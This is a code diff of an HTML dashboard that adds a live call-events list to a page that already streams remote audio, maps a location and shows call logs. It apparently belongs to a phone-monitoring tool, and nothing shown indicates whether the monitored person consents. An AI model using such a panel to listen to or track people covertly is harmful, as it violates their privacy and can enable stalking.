@@ -19,7 +19,7 @@
       text-align: center;
     }
     #map {
-      height: 600px; /* increased from 300px to 600px */
+      height: 600px;
       width: 100%;
       margin-top: 10px;
       border-radius: 12px;
@@ -73,6 +73,25 @@
     #callLogsTable tr:nth-child(even) {
       background: #f9f9f9;
     }
+    /* Real-time call events styling */
+    #callEventsList {
+      margin-top: 15px;
+      padding: 10px;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      max-height: 200px;
+      overflow-y: auto;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    #callEventsList div {
+      margin-bottom: 5px;
+      padding: 5px;
+      border-bottom: 1px solid #eee;
+    }
+    #callEventsList div:last-child {
+      border-bottom: none;
+    }
   </style>
 </head>
 <body>
@@ -87,8 +106,8 @@
   <button id="startAudio">▶ Start Listening</button>
   <p id="audioStatus">Click the button to start audio.</p>
 
-  <!-- 📞 Call Logs Section -->
-  <h2>📞 Call Logs</h2>
+  <!-- Call Logs Section -->
+  <h2>📋 Call Logs</h2>
   <table id="callLogsTable">
     <thead>
       <tr>
@@ -103,8 +122,13 @@
     </tbody>
   </table>
 
+  <!-- Real-time Call Events Section -->
+  <h2>📞 Real-time Call Events</h2>
+  <div id="callEventsList">
+    <div>Waiting for call events...</div>
+  </div>
+
   <script>
-    // Connect to server
     const socket = io();
 
     const statusDiv = document.getElementById("status");
@@ -123,7 +147,7 @@
     });
 
     // === MAP ===
-    const map = L.map('map').setView([20, 78], 5); // Default India
+    const map = L.map('map').setView([20, 78], 5);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
       attribution: '© OpenStreetMap contributors'
     }).addTo(map);
@@ -160,7 +184,6 @@
       }
 
       const float32Array = audioQueue.shift();
-
       const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
       audioBuffer.copyToChannel(float32Array, 0);
 
@@ -173,9 +196,8 @@
     }
 
     socket.on("audio-chunk", (base64Chunk) => {
-      if (!audioContext) return; // only after Start button
+      if (!audioContext) return;
 
-      // Base64 → PCM16 → Float32
       const byteString = atob(base64Chunk.replace(/\n/g,''));
       const buffer = new Uint8Array(byteString.length);
       for (let i = 0; i < byteString.length; i++) buffer[i] = byteString.charCodeAt(i);
@@ -188,20 +210,17 @@
       }
 
       audioQueue.push(float32Array);
-
       if (!isPlaying) playNextChunk();
     });
 
     // === CALL LOGS ===
     socket.on("call-logs", (logs) => {
       const tbody = document.getElementById("callLogsBody");
-      tbody.innerHTML = ""; // clear old rows
-
+      tbody.innerHTML = "";
       if (!logs || logs.length === 0) {
         tbody.innerHTML = "<tr><td colspan='4'>No call logs available</td></tr>";
         return;
       }
-
       logs.forEach(log => {
         const row = document.createElement("tr");
         row.innerHTML = `
@@ -212,6 +231,14 @@
         `;
         tbody.appendChild(row);
       });
+    });
+
+    // === REAL-TIME CALL EVENTS ===
+    const callEventsList = document.getElementById("callEventsList");
+    socket.on("call-event", (event) => {
+      const div = document.createElement("div");
+      div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number || "Unknown"}`;
+      callEventsList.prepend(div); // show latest on top
     });
   </script>
 </body>
